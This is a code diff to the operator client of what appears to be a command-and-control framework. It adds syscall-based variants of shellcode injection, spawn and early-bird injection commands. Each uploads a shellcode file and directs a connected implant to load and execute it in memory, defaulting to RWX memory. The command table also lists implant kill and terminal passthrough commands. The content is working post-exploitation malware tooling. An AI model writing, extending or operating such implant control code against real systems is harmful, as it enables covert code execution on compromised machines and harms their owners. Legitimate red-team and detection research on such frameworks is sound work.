@@ -152,6 +152,46 @@ def cmd_shell(args: List[str], app):
 
     return
 
+# syscall variant of shellcode-inject
+def cmd_shellcode_inject_sys(args: List[str], app):
+    # Must be 3 args
+    client_errors.arg_len_error(args, min=2, max=4)
+
+    # Error if not connected to implant
+    if not connected_to_implant():
+        raise client_errors.NotConnectedToImplant
+
+    if len(args) == 4:
+        if args[3] != "RX" and args[3] != "RWX":
+            raise client_errors.CommandDoesntExist
+
+    # Create a file id for the file to be saved
+    file_id = encryption.id_generator(N=32)
+
+    # Create a command id
+    cmd_id = encryption.id_generator(N=32)
+
+    # Create the command string
+    # If RW or RWX specified
+    if len(args) == 4:
+        cmd_str = storage.create_command_str(cmd_id, storage.CMD_TYPE.CMD_SHELLCODE_INJECT_SYS, [file_id, args[2], args[3]]) 
+    else:
+        cmd_str = storage.create_command_str(cmd_id, storage.CMD_TYPE.CMD_SHELLCODE_INJECT_SYS, [file_id, args[2], "RWX"]) 
+
+    # Post the file, if it doesn't exist, will raise FileDoesntExist exception
+    uploaded_filename = post_file_command(file_path=args[1],
+                                          file_id=file_id,
+                                          cmd_id=cmd_id,
+                                          cmd_type=storage.CMD_TYPE.CMD_SHELLCODE_INJECT_SYS,
+                                          cmd_str=cmd_str
+                                          )
+    
+    # Check for server error on the return, raise a UploadFailure
+    if uploaded_filename == server_codes.ServerErrors.ERR_UPLOAD_EXCEPTION.value:
+        raise client_errors.UploadFailure 
+    
+    print_success(cmd_id=cmd_id, args=args, app=app)
+    return
 # Command that sends a shellcode file to the server as well as a command
 # The command is read first, and tells the implant where to pull the 
 # shellcode file from on the server, reads it into memory, and executes
@@ -185,6 +225,46 @@ def cmd_shellcode_inject(args: List[str], app):
                                           file_id=file_id,
                                           cmd_id=cmd_id,
                                           cmd_type=storage.CMD_TYPE.CMD_SHELLCODE_INJECT,
+                                          cmd_str=cmd_str
+                                          )
+    
+    # Check for server error on the return, raise a UploadFailure
+    if uploaded_filename == server_codes.ServerErrors.ERR_UPLOAD_EXCEPTION.value:
+        raise client_errors.UploadFailure 
+    
+    print_success(cmd_id=cmd_id, args=args, app=app)
+    return
+# syscall variant of shellcode-spawn
+def cmd_shellcode_spawn_sys(args: List[str], app):
+    # Must be 2 args
+    client_errors.arg_len_error(args, max=3, min=2)
+
+    if len(args) == 3:
+        if args[2] != "RX" and args[2] != "RWX":
+            raise client_errors.CommandDoesntExist
+
+    # Error if not connected to implant
+    if not connected_to_implant():
+        raise client_errors.NotConnectedToImplant
+
+    # Create a file id for the file to be saved
+    file_id = encryption.id_generator(N=32)
+
+    # Create a command id
+    cmd_id = encryption.id_generator(N=32)
+
+    # Create the command string
+    # If no specification of memory protection, default to RWX
+    if len(args) == 2:
+        cmd_str = storage.create_command_str(cmd_id, storage.CMD_TYPE.CMD_SHELLCODE_SPAWN_SYS, [file_id, "RWX"]) 
+    else:
+        cmd_str = storage.create_command_str(cmd_id, storage.CMD_TYPE.CMD_SHELLCODE_SPAWN_SYS, [file_id, args[2]]) 
+
+    # Post the file, if it doesn't exist, will raise FileDoesntExist exception
+    uploaded_filename = post_file_command(file_path=args[1],
+                                          file_id=file_id,
+                                          cmd_id=cmd_id,
+                                          cmd_type=storage.CMD_TYPE.CMD_SHELLCODE_SPAWN_SYS,
                                           cmd_str=cmd_str
                                           )
     
@@ -236,6 +316,46 @@ def cmd_shellcode_spawn(args: List[str], app):
     print_success(cmd_id=cmd_id, args=args, app=app)
     return
 
+# syscall variant of earlybird injection
+def cmd_shellcode_earlybird_sys(args: List[str], app):
+    # Must be 2 args
+    client_errors.arg_len_error(args, max=3, min=2)
+
+    if len(args) == 3:
+        if args[2] != "RX" and args[2] != "RWX":
+            raise client_errors.CommandDoesntExist
+
+    # Error if not connected to implant
+    if not connected_to_implant():
+        raise client_errors.NotConnectedToImplant
+
+    # Create a file id for the file to be saved
+    file_id = encryption.id_generator(N=32)
+
+    # Create a command id
+    cmd_id = encryption.id_generator(N=32)
+
+    # Create the command string
+    # If no specification of memory protection, default to RWX
+    if len(args) == 2:
+        cmd_str = storage.create_command_str(cmd_id, storage.CMD_TYPE.CMD_SHELLCODE_EARLYBIRD_SYS, [file_id, "RWX"]) 
+    else:
+        cmd_str = storage.create_command_str(cmd_id, storage.CMD_TYPE.CMD_SHELLCODE_EARLYBIRD_SYS, [file_id, args[2]]) 
+
+    # Post the file, if it doesn't exist, will raise FileDoesntExist exception
+    uploaded_filename = post_file_command(file_path=args[1],
+                                          file_id=file_id,
+                                          cmd_id=cmd_id,
+                                          cmd_type=storage.CMD_TYPE.CMD_SHELLCODE_EARLYBIRD_SYS,
+                                          cmd_str=cmd_str
+                                          )
+    
+    # Check for server error on the return, raise a UploadFailure
+    if uploaded_filename == server_codes.ServerErrors.ERR_UPLOAD_EXCEPTION.value:
+        raise client_errors.UploadFailure 
+    
+    print_success(cmd_id=cmd_id, args=args, app=app)
+    return
 def cmd_shellcode_earlybird(args: List[str], app):
     # Must be 2 args
     client_errors.arg_len_error(args, max=3, min=2)
@@ -398,6 +518,9 @@ CMD_TABLE = {
                 "shellcode-inject": cmd_shellcode_inject,
                 "shellcode-spawn": cmd_shellcode_spawn,
                 "shellcode-earlybird": cmd_shellcode_earlybird,
+                "shellcode-spawn-sys": cmd_shellcode_spawn_sys,
+                "shellcode-inject-sys": cmd_shellcode_inject_sys,
+                "shellcode-earlybird-sys": cmd_shellcode_earlybird_sys,
                 "kill": cmd_kill_implant,
                 "!": cmd_terminal_passthrough,
                 "nickname": cmd_nickname,
